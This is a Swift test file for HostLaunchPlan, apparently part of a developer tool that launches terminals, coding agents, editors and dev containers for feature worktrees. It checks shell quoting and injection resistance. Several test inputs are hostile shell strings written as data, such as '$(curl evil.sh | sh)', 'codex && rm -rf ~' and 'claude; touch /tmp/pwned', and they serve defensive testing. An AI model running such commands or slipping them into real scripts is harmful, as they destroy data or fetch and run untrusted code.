import BranchBoxKit
import Foundation
import Testing

@Suite struct HostLaunchPlanTests {
    private static let awkwardPath = "/Users/dev/My Projects/it's $HOME/eta"

    /// The words `/bin/sh` would hand to `exec` in `script`: the script's command line runs with `exec` swapped
    /// for a NUL-separated printer and `cd` for a no-op, so nothing is executed and no folder needs to exist.
    private static func words(of script: String) throws -> [String] {
        #expect(script.hasPrefix("#!/bin/sh\n"))
        let line = String(script.dropFirst("#!/bin/sh\n".count).dropLast())   // the single command line
        let printer = "printf '%s\\0' "
        let printing: String
        if line.hasPrefix("exec ") {
            printing = printer + line.dropFirst("exec ".count)
        } else {
            let parts = line.components(separatedBy: " && exec ")
            try #require(parts.count >= 2 && parts[0].hasPrefix("cd "))
            printing = ": " + parts[0].dropFirst("cd ".count) + " && " + printer + parts.dropFirst().joined(separator: " && exec ")
        }
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/sh")
        process.arguments = ["-c", printing]
        process.environment = ["PATH": "/usr/bin:/bin"]
        let output = Pipe()
        process.standardOutput = output
        try process.run()
        let data = output.fileHandleForReading.readDataToEndOfFile()
        process.waitUntilExit()
        #expect(process.terminationStatus == 0)
        return String(decoding: data, as: UTF8.self).split(separator: "\0", omittingEmptySubsequences: false).dropLast().map(String.init)
    }

    private static func script(_ plan: HostLaunchPlan) -> String? {
        guard case .terminalScript(let script, _) = plan.kind else { return nil }
        return script
    }

    // MARK: Quoting

    @Test(arguments: [
        ("simple", "simple"), ("a/b-c_d.e:f@g%h+i=j,k", "a/b-c_d.e:f@g%h+i=j,k"), ("", "''"),
        ("two words", "'two words'"), ("it's", "'it'\\''s'"), ("$HOME", "'$HOME'"), ("`x`", "'`x`'"),
        ("a\"b", "'a\"b'"), ("new\nline", "'new\nline'"), ("ünïcode", "'ünïcode'"), ("*", "'*'"),
    ])
    func shellQuote(word: String, quoted: String) {
        #expect(HostLaunchPlan.shellQuote(word) == quoted)
    }

    @Test(arguments: ["plain", "two words", "it's", "$HOME and $(rm -rf /)", "\"double\" 'single'", "back\\slash",
                      "tab\there", "`cmd`", "-n", "!bang", "", "multi\nline prompt", "émoji 🚀"])
    func quotedWordsSurviveTheShell(word: String) throws {
        let script = HostLaunchPlan.script(cd: nil, exec: HostLaunchPlan.shellCommand(["echo", word]))
        #expect(try Self.words(of: script) == ["echo", word])
    }

    // MARK: Terminal and agent

    @Test func terminalOpensALoginShellInTheFolder() throws {
        let record = Sample.record(worktreePath: Self.awkwardPath)
        let plan = HostLaunchPlan.terminal(.iTerm, record: record)
        #expect(plan.kind == .terminalScript(script: "#!/bin/sh\ncd '/Users/dev/My Projects/it'\\''s $HOME/eta' && exec \"${SHELL:-/bin/zsh}\" -l\n",
                                             terminal: .iTerm))
        #expect(plan.workingDirectory == Self.awkwardPath)
        #expect(plan.isEnabled)
        #expect(plan.copyCommand == nil)
    }

    @Test func agentGetsThePromptAsItsFirstArgument() throws {
        let prompt = "Fix the \"login\" bug; don't touch $PATH or `rm`"
        let record = Sample.record(prompt: prompt, worktreePath: Self.awkwardPath)
        let plan = HostLaunchPlan.agent(.claude, terminal: .terminal, record: record, passPrompt: true)
        let script = try #require(Self.script(plan))
        #expect(script.hasPrefix("#!/bin/sh\ncd '/Users/dev/My Projects/it'\\''s $HOME/eta' && exec claude -- '"))
        #expect(try Self.words(of: script) == ["claude", "--", prompt])

        // A prompt that looks like a flag stays the prompt.
        let flagLike = HostLaunchPlan.agent(.codex, terminal: .terminal, record: Sample.record(prompt: "--dangerously-skip-permissions"),
                                            passPrompt: true)
        #expect(try Self.words(of: try #require(Self.script(flagLike))) == ["codex", "--", "--dangerously-skip-permissions"])

        let withoutPrompt = HostLaunchPlan.agent(.codex, terminal: .terminal, record: record, passPrompt: false)
        #expect(try Self.words(of: try #require(Self.script(withoutPrompt))) == ["codex"])

        let blankPrompt = HostLaunchPlan.agent(.codex, terminal: .terminal, record: Sample.record(prompt: "  "), passPrompt: true)
        #expect(try Self.words(of: try #require(Self.script(blankPrompt))) == ["codex"])
    }

    @Test func customAgentCommandIsUsedAsWritten() throws {
        let record = Sample.record(prompt: "it's a test")
        let plan = HostLaunchPlan.agent(.custom(command: " aider --model 'sonnet 4' "), terminal: .custom(template: "x {command}"),
                                        record: record, passPrompt: true)
        #expect(Self.script(plan) == "#!/bin/sh\ncd /tmp/bbx/eta && exec aider --model 'sonnet 4' 'it'\\''s a test'\n")
        #expect(try Self.words(of: try #require(Self.script(plan))) == ["aider", "--model", "sonnet 4", "it's a test"])
        #expect(HostLaunchPlan.agent(.custom(command: "  "), terminal: .terminal, record: record, passPrompt: false).disabledReason
            == "Set a coding agent command in Settings")
    }

    @Test(arguments: [
        (String?.none, AgentChoice.codex, AgentChoice.codex), ("", .codex, .codex), ("claude", .codex, .claude),
        ("Codex", .claude, .codex), ("aider", .claude, .custom(command: "aider")),
        ("gemini-cli", .claude, .custom(command: "gemini-cli")),
        // Repository config is never shell text: anything but a bare executable name falls back.
        ("aider --yes", .claude, .claude), ("claude; touch /tmp/pwned", .codex, .codex),
        ("$(curl evil.sh | sh)", .claude, .claude), ("a|b", .claude, .claude), ("-x", .claude, .claude),
        ("`id`", .codex, .codex), ("../bin/agent", .claude, .claude),
    ])
    func agentResolution(projectDefault: String?, fallback: AgentChoice, expected: AgentChoice) {
        #expect(HostLaunchPlan.agentChoice(projectDefault: projectDefault, fallback: fallback) == expected)
    }

    @Test func aProjectDefaultAgentNeverReachesTheScriptAsShellText() throws {
        for value in ["claude; touch /tmp/pwned", "codex && rm -rf ~", "$(id)", "x|y", "a b"] {
            let choice = HostLaunchPlan.agentChoice(projectDefault: value, fallback: .claude)
            let plan = HostLaunchPlan.agent(choice, terminal: .terminal, record: Sample.record(prompt: nil), passPrompt: false)
            let script = try #require(Self.script(plan))
            #expect(!script.contains(value), "\(value) reached the script: \(script)")
            #expect(try Self.words(of: script) == ["claude"])
        }
    }

    @Test func sandboxTerminalAndAgentAreDisabledWithACopyCommand() {
        let record = Sample.record(provider: .sbx, runtimeID: "bb-eta", prompt: "x")
        for plan in [HostLaunchPlan.terminal(.terminal, record: record),
                     HostLaunchPlan.agent(.claude, terminal: .terminal, record: record, passPrompt: true)] {
            #expect(plan.kind == .disabled(reason: "Opening a shell in a Docker Sandbox needs `branchbox feature exec --interactive` (planned)"))
            #expect(plan.copyCommand == "sbx exec bb-eta bash")
            #expect(!plan.isEnabled)
        }
        #expect(HostLaunchPlan.terminal(.terminal, record: Sample.record(provider: .sbx)).copyCommand == nil)
        #expect(HostLaunchPlan.sandboxShellCommand(runtimeID: "odd id") == "sbx exec 'odd id' bash")
    }

    // MARK: Missing folders and removed features

    @Test func missingFolderDisablesEveryHostAction() {
        let record = Sample.record()
        let running = DevcontainerStatus(state: .running, containerID: "c0ffee")
        let plans = [
            HostLaunchPlan.editor(.vscode, mode: .folder, record: record, folderExists: false),
            HostLaunchPlan.editor(.cursor, mode: .devContainer, record: record, folderExists: false),
            HostLaunchPlan.terminal(.terminal, record: record, folderExists: false),
            HostLaunchPlan.agent(.claude, terminal: .terminal, record: record, passPrompt: false, folderExists: false),
            HostLaunchPlan.devcontainerShell(running, terminal: .terminal, record: record, folderExists: false),
        ]
        for plan in plans {
            #expect(plan.disabledReason == "The folder /tmp/bbx/eta is missing")
        }
        // A sandbox with a missing folder names the folder, not the sandbox.
        #expect(HostLaunchPlan.terminal(.terminal, record: Sample.record(provider: .sbx), folderExists: false).disabledReason
            == "The folder /tmp/bbx/eta is missing")
    }

    @Test func removedOrFolderlessFeaturesAreDisabled() {
        #expect(HostLaunchPlan.editor(.vscode, mode: .folder, record: Sample.record(status: .removed)).disabledReason
            == "eta has been torn down")
        let folderless = FeatureRecord(workFeature: "eta", branchName: "feature/eta")
        #expect(HostLaunchPlan.terminal(.terminal, record: folderless).disabledReason == "eta has no folder")
        #expect(HostLaunchPlan.agent(.claude, terminal: .terminal, record: folderless, passPrompt: false).disabledReason
            == "eta has no folder")
    }

    // MARK: Editor

    @Test func editorOpensTheFolderByBundleIDOrPath() {
        let record = Sample.record()
        #expect(HostLaunchPlan.editor(.vscode, mode: .folder, record: record).kind
            == .openFolder(appBundleID: "com.microsoft.VSCode", appPath: nil, path: "/tmp/bbx/eta"))
        #expect(HostLaunchPlan.editor(.cursor, mode: .folder, record: record).kind
            == .openFolder(appBundleID: "com.todesktop.230313mzl4w4u92", appPath: nil, path: "/tmp/bbx/eta"))
        #expect(HostLaunchPlan.editor(.custom(appPath: "/Applications/Zed.app"), mode: .folder, record: record).kind
            == .openFolder(appBundleID: nil, appPath: "/Applications/Zed.app", path: "/tmp/bbx/eta"))
        #expect(HostLaunchPlan.editor(.custom(appPath: ""), mode: .folder, record: record).disabledReason
            == "Choose an editor app in Settings")
        // Sandboxes have a host folder too, so the editor works for them.
        #expect(HostLaunchPlan.editor(.vscode, mode: .folder, record: Sample.record(provider: .sbx)).isEnabled)
    }

    @Test func devContainerURI() throws {
        let uri = try #require(HostLaunchPlan.devContainerURI(worktreePath: "/tmp/x", workspaceFolder: "/workspaces/x"))
        #expect(uri.absoluteString == "vscode-remote://dev-container+2f746d702f78/workspaces/x")
        let spaced = try #require(HostLaunchPlan.devContainerURI(worktreePath: "/tmp/My Dir", workspaceFolder: "workspaces/My Dir"))
        #expect(spaced.absoluteString == "vscode-remote://dev-container+2f746d702f4d7920446972/workspaces/My%20Dir")
        #expect(HostLaunchPlan.devContainerDeepLink(scheme: "vscode", worktreePath: "", workspaceFolder: "/w") == nil)
    }

    @Test func devContainerModeOpensTheEditorsRemoteLink() throws {
        let record = Sample.record(worktreePath: "/tmp/x")
        #expect(HostLaunchPlan.editor(.vscode, mode: .devContainer, record: record).kind
            == .openURL(try #require(URL(string: "vscode://vscode-remote/dev-container+2f746d702f78/workspaces/x"))))
        let custom = Sample.record(worktreePath: "/tmp/x", workspaceFolder: "/srv/app")
        #expect(HostLaunchPlan.editor(.cursor, mode: .devContainer, record: custom).kind
            == .openURL(try #require(URL(string: "cursor://vscode-remote/dev-container+2f746d702f78/srv/app"))))
        #expect(HostLaunchPlan.editor(.custom(appPath: "/Applications/Zed.app"), mode: .devContainer, record: record).disabledReason
            == "Open in Dev Container needs VS Code or Cursor")
        for provider in [RuntimeProvider.sbx, .localVM, .inGuest] {
            #expect(HostLaunchPlan.editor(.vscode, mode: .devContainer, record: Sample.record(provider: provider)).disabledReason
                == "Only features on the container runtime open in a dev container")
        }
    }

    // MARK: Dev container shell

    @Test func devcontainerShell() throws {
        let service = DevcontainerServiceInfo(serviceName: "app", port: 3000, serviceURL: nil, containerUser: "vscode")
        let running = DevcontainerStatus(state: .running, containerID: "c0ffee", service: service)
        let plan = HostLaunchPlan.devcontainerShell(running, terminal: .terminal, record: Sample.record(worktreePath: Self.awkwardPath),
                                                    folderExists: true)
        let script = try #require(Self.script(plan))
        #expect(script.hasSuffix("&& exec docker exec -it -u vscode -w /workspaces/eta c0ffee bash -l\n"))
        #expect(try Self.words(of: script) == ["docker", "exec", "-it", "-u", "vscode", "-w", "/workspaces/eta", "c0ffee", "bash", "-l"])
        #expect(plan.workingDirectory == Self.awkwardPath)

        // Without the record: no folder to start in and no workspace folder.
        #expect(Self.script(HostLaunchPlan.devcontainerShell(running, terminal: .iTerm))
            == "#!/bin/sh\nexec docker exec -it -u vscode c0ffee bash -l\n")
        let anonymous = DevcontainerStatus(state: .running, containerID: "c0ffee")
        #expect(Self.script(HostLaunchPlan.devcontainerShell(anonymous, terminal: .iTerm)) == "#!/bin/sh\nexec docker exec -it c0ffee bash -l\n")
        // The record's user when detect named none.
        let fromRecord = HostLaunchPlan.devcontainerShell(anonymous, terminal: .terminal,
                                                          record: Sample.record(workspaceFolder: "/w s", containerUser: "dev"),
                                                          folderExists: true)
        #expect(try Self.words(of: try #require(Self.script(fromRecord)))
            == ["docker", "exec", "-it", "-u", "dev", "-w", "/w s", "c0ffee", "bash", "-l"])
    }

    @Test(arguments: [DevcontainerStatus(state: .stopped, containerID: "c0ffee"), DevcontainerStatus(state: .notCreated),
                      DevcontainerStatus(state: .unknown), DevcontainerStatus(state: .running, containerID: "")])
    func devcontainerShellNeedsARunningContainer(status: DevcontainerStatus) {
        #expect(HostLaunchPlan.devcontainerShell(status, terminal: .terminal).disabledReason
            == "The dev container isn't running; start it first")
    }

    @Test func devcontainerShellIsContainerOnly() {
        let running = DevcontainerStatus(state: .running, containerID: "c0ffee")
        #expect(HostLaunchPlan.devcontainerShell(running, terminal: .terminal, record: Sample.record(provider: .sbx),
                                                 folderExists: true).disabledReason
            == "Only features on the container runtime have a dev container")
    }

    @Test func workspaceFolderDefaultsToTheTemplate() {
        #expect(HostLaunchPlan.workspaceFolder(for: Sample.record()) == "/workspaces/eta")
        #expect(HostLaunchPlan.workspaceFolder(for: Sample.record(worktreePath: "/a/b/other")) == "/workspaces/other")
        #expect(HostLaunchPlan.workspaceFolder(for: Sample.record(workspaceFolder: "/srv")) == "/srv")
    }
}
